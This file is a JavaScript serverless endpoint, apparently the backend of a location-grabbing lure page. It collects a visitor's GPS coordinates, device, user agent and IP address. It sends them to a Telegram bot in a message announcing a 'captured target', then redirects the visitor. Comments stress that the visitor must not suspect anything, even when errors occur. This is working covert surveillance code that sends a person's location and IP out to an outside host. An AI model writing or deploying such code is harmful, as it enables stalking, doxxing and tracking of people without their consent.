// /api/track.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  const { lat, lng, device, userAgent } = req.body;
  
  // IP detectada por el servidor (imposible de falsificar por el usuario)
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // 1. CONSTRUCCIÓN DEL MENSAJE (Estrategia Glitch)
  const mensaje = `
🎯 **OBJETIVO CAPTURADO: BOUMPER TV**
------------------------------------
📍 Ubicación: https://www.google.com/maps?q=${lat},${lng}
📱 Dispositivo: ${device}
🌐 IP: ${ip}
🕵️ UserAgent: ${userAgent}
------------------------------------
Status: El intruso cree que está en tu estudio.
  `;

  try {
    // 2. ENVÍO AL BOT (Usando variables de entorno ocultas)
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown'
      })
    });

    // 3. RESPUESTA SILENCIOSA
    // Devolvemos la URL de tu estudio para que el frontend haga el redirect
    res.status(200).json({ redirectUrl: "https://www.google.com/maps/search/tu+estudio+real" });

  } catch (error) {
    // Si falla, el usuario no debe sospechar. Mandamos el error al log interno pero no al cliente.
    console.error("Error de track:", error);
    res.status(200).json({ redirectUrl: "https://www.google.com/maps" });
  }
}
